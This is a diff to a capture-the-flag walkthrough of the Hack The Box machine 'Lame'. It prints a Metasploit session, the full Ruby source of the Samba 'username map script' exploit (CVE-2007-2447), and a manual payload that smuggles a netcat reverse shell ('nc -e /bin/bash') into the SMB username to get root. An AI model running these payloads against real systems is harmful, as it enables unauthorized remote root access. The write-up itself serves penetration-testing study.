@@ -69,9 +69,15 @@ Host script results:
 
 I would always keep ssh on the bottom of my list to enumerate because generally you don't get vulnerable points in SSH. So let's begin with ftp(port 21).
 
+## Exploitation
+
 We have anonymous login enabled. Let's check it:
 
+![ftp anonymous login](../.medias/lame/ftp_anon.png)
 
+Argh!, useless. No interesting information here.
+
+Let's hunt vsftpd 2.3.4 down 😉.
 
 ```bash
 ┌──(cyb3ritic㉿kali)-[~/Downloads]
@@ -132,7 +138,7 @@ tn2.interact()
 ```
 
 Let's try to run this exploit. And a badluck, it didn't work.🥲
-But no worries, we still got one exploit left in our quiever. Let's give it a try.
+But no worries, we still got one exploit left in our quiver. Let's give it a try.
 
 ```bash
 msf6 > search vsftpd 2.3.4
@@ -158,4 +164,254 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 [*] Exploit completed, but no session was created.
 ```
 
-Nope, couldn't catch a fish.
+Nope, couldn't catch a fish. Let's move on to the smaba.
+
+```bash
+┌──(cyb3ritic㉿kali)-[~]
+└─$ searchsploit samba 3.0.20                          
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                      |  Path
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                              | multiple/remote/10095.txt
+Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                    | unix/remote/16320.rb
+Samba < 3.0.20 - Remote Heap Overflow                                                                               | linux/remote/7701.txt
+Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                       | linux_x86/dos/36741.py
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+```
+
+Cool 🤩, we have a 'username' map script for command injection using Metasploit. Let's check it out.
+
+```bash
+msf6 > search samba 3.0.20
+
+Matching Modules
+================
+
+   #  Name                                Disclosure Date  Rank       Check  Description
+   -  ----                                ---------------  ----       -----  -----------
+   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script
+
+msf6 > use 0
+[*] No payload configured, defaulting to cmd/unix/reverse_netcat
+msf6 exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
+RHOST => 10.10.10.3
+msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
+LHOST => tun0
+msf6 exploit(multi/samba/usermap_script) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.18:4444 
+[*] Command shell session 1 opened (10.10.14.18:4444 -> 10.10.10.3:36330) at 2024-08-14 18:24:02 +0530
+
+whoami
+root
+shell
+[*] Trying to find binary 'python' on the target machine
+[*] Found python at /usr/bin/python
+[*] Using `python` to pop up an interactive shell
+[*] Trying to find binary 'bash' on the target machine
+[*] Found bash at /bin/bash
+root@lame:/# id
+id
+uid=0(root) gid=0(root)
+```
+
+So, we were able to compromise the system using Metasploit and got the access to root user.
+
+
+### Try without metasploit
+
+In most of the prestigious exams including OSCP, the frameworks like Metasploit is not allowed. So we must also learn to solve this without using Metasploit. Let's dive in..
+
+Let's start SAMBA/SMB enumeration with smbclient. It will allow to attemp to connect to share and get anonymous access (if allowed).
+- `smbclient -L 10.10.10.3` (-L flag is used to list all the shares)
+- just press enter when prompted for password and you can anoymously access the content.
+```bash
+┌──(cyb3ritic㉿kali)-[~]
+└─$ smbclient -L 10.10.10.3
+Password for [WORKGROUP\cyb3ritic]:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk      
+        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+Reconnecting with SMB1 for workgroup listing.
+Anonymous login successful
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            LAME                                    
+```
+
+- Here, `tmp` share with the comment `oh noes!` looks interesting. Let's try it.
+```bash
+┌──(cyb3ritic㉿kali)-[~]
+└─$ smbclient \\\\10.10.10.3\\tmp
+Password for [WORKGROUP\cyb3ritic]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Aug 14 18:52:20 2024
+  ..                                 DR        0  Sat Oct 31 12:03:58 2020
+  orbit-makis                        DR        0  Wed Aug 14 15:55:32 2024
+  hbnez                               N        0  Tue Aug 13 07:59:27 2024
+  .ICE-unix                          DH        0  Mon Aug 12 21:40:40 2024
+  vmware-root                        DR        0  Mon Aug 12 21:41:08 2024
+  .X11-unix                          DH        0  Mon Aug 12 21:41:06 2024
+  ixujvi                              N        0  Tue Aug 13 01:27:16 2024
+  gconfd-makis                       DR        0  Wed Aug 14 15:55:32 2024
+  nc64.exe                            A    45272  Wed Aug 14 06:33:15 2024
+  .X0-lock                           HR       11  Mon Aug 12 21:41:06 2024
+  kvbn                                N        0  Tue Aug 13 22:42:26 2024
+  hago                                N        0  Tue Aug 13 05:39:00 2024
+  5555.jsvc_up                        R        0  Mon Aug 12 21:41:41 2024
+  vgauthsvclog.txt.0                  R     1600  Mon Aug 12 21:40:38 2024
+
+                7282168 blocks of size 1024. 5385852 blocks available
+smb: \>
+```
+
+Unfortunately, tmp was the only share we were authorized to connect. We got hte bunch of files and nothing else.
+
+While searching for the exploit for smb 3.0.20, usig searchsploit, we got an exploit `16320,rb` which was used my metasploit. Let's analyze the exploit.
+- first copy the exploit to your working directory
+    - `searchsploit -m 16320.rb`
+    ```bash
+    ┌──(cyb3ritic㉿kali)-[~]
+    └─$ searchsploit -m 16320.rb 
+    Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
+        URL: https://www.exploit-db.com/exploits/16320
+        Path: /usr/share/exploitdb/exploits/unix/remote/16320.rb
+        Codes: CVE-2007-2447, OSVDB-34700
+    Verified: True
+    File Type: Ruby script, ASCII text
+    Copied to: /home/cyb3ritic/16320.rb
+    ```
+
+Let's see what's inside this exploit. `cat 16320.rb`
+```ruby 
+##
+# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+    Rank = ExcellentRanking
+
+    include Msf::Exploit::Remote::SMB
+
+    # For our customized version of session_setup_ntlmv1
+    CONST = Rex::Proto::SMB::Constants
+    CRYPT = Rex::Proto::SMB::Crypt
+
+    def initialize(info = {})
+        super(update_info(info,
+            'Name'           => 'Samba "username map script" Command Execution',
+            'Description'    => %q{
+                            This module exploits a command execution vulerability in Samba
+                    versions 3.0.20 through 3.0.25rc3 when using the non-default
+                    "username map script" configuration option. By specifying a username
+                    containing shell meta characters, attackers can execute arbitrary
+                    commands.
+
+                    No authentication is needed to exploit this vulnerability since
+                    this option is used to map usernames prior to authentication!
+            },
+            'Author'         => [ 'jduck' ],
+            'License'        => MSF_LICENSE,
+            'Version'        => '$Revision: 10040 $',
+            'References'     =>
+                    [
+                        [ 'CVE', '2007-2447' ],
+                        [ 'OSVDB', '34700' ],
+                        [ 'BID', '23972' ],
+                        [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
+                        [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
+                    ],
+            'Platform'       => ['unix'],
+            'Arch'           => ARCH_CMD,
+            'Privileged'     => true, # root or nobody user
+            'Payload'        =>
+                    {
+                        'Space'    => 1024,
+                        'DisableNops' => true,
+                        'Compat'      =>
+                                {
+                                    'PayloadType' => 'cmd',
+                                    # *_perl and *_ruby work if they are installed
+                                    # mileage may vary from system to system..
+                                }
+                    },
+            'Targets'        =>
+                    [
+                            [ "Automatic", { } ]
+                    ],
+            'DefaultTarget'  => 0,
+            'DisclosureDate' => 'May 14 2007'))
+
+        register_options(
+            [
+                    Opt::RPORT(139)
+            ], self.class)
+    end
+        def exploit
+
+            connect
+
+            # lol?
+            username = "/=`nohup " + payload.encoded + "`"
+            begin
+                simple.client.negotiate(false)
+                simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
+            rescue ::Timeout::Error, XCEPT::LoginError
+                    # nothing, it either worked or it didn't ;)
+            end
+            handler
+        end
+end  
+
+```
+
+The key part is `def exploit` function. It's changing an smb session using:
+- username = /=\`nohop [payload]\`
+- password - random 16 characters
+- domain = user provided domain
+
+So basically on Linux, \` \` are used to execute and put the output in place, just like $(). It seems Samba is allowing that to happen inside the username. Metasploit is calling nohup (which starts the process outside the current context) and then a payload. Let's login anonymously and then change the user using following command payload
+
+- `logon "./='nohop nc -e /bin/bash <ip_addr> <port>`
+
+ I fired up my netcat listener on 1234 port and tried this payload.
+ ![smb exploit](../.medias/lame/smb_exploit.png)
+
+ I got shell with root access on my netcat listener. We can go to the users home directory and grab the user flag by using the following command: `cat /home/markis/user.txt`
+ ![user flag](../.medias/lame/user_flag.png)
+
+ Similarly, we can grab the root flag using the following command: `cat /root/root.txt`
+![root flag](../.medias/lame/root_flag.png)
+
+Ans Voilà, we pwned lame.
+Hope you guys enjoyed reading this and learned something new.
+
+Keep Hacking..
+
+Until we meet again...
+
+![lame pwned](../.medias/lame/lame_pwned.png)
